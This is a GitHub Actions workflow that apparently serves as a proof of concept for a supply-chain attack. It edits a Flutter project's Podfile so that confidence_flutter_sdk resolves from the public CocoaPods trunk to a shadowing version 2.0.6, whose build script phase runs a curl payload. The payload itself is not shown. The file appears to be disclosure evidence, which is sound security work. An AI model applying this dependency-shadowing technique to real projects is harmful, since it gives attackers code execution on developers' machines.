name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain (The Silent Hijack)
        run: |
          # 1. INITIALIZATION: Build fresh environment
          rm -rf rce_test
          flutter create rce_test
          cd rce_test
          
          # DEMONSTRATION: Narik versi asli di level Pub/Dart
          # Ini mensimulasikan langkah yang dilakukan developer sesuai README Spotify
          flutter pub add confidence_flutter_sdk:0.2.1
          
          # 2. THE HIJACK: Patching Podfile
          # Bypass constraint platform lama agar build berjalan mulus
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # Putus otomatisasi Flutter ke plugin lokal (Force Public Registry Lookup)
          # Ini adalah "The Shadowing" mechanism
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          
          # NATURAL RESOLUTION: Jangan di-pin versinya. 
          # Biarkan CocoaPods memilih versi tertinggi (2.0.6) secara otomatis dari Trunk
          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
          
          echo "=== Debugging Podfile Content ==="
          cat ios/Podfile
          
          cd ios
          # 3. SUPER CLEANUP PROTOCOL (Bypass Cache Latency)
          echo "=== Purging Everything to Ensure Clean Resolution ==="
          pod cache clean --all
          rm -rf Pods Podfile.lock
          rm -rf ~/.cocoapods/repos/trunk || true
          
          # 4. TRIGGER RESOLUTION
          # Paksa fetch metadata terbaru dari CDN publik
          pod repo update trunk || true
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock Status ==="
          # Bukti krusial: Apakah ter-resolve ke 2.0.6?
          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "CRITICAL: Hijacking failed"
          
          cd ..
          # 5. EXECUTION PHASE: Triggering the Script Phase
          # Xcode akan mengeksekusi payload curl sebelum kompilasi Swift
          echo "=== Launching Build to Trigger Payload ==="
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Final Audit Log (Search for Payload Execution) ==="
          grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"

      - name: Upload PoC Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rce-evidence-v2.0.6
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
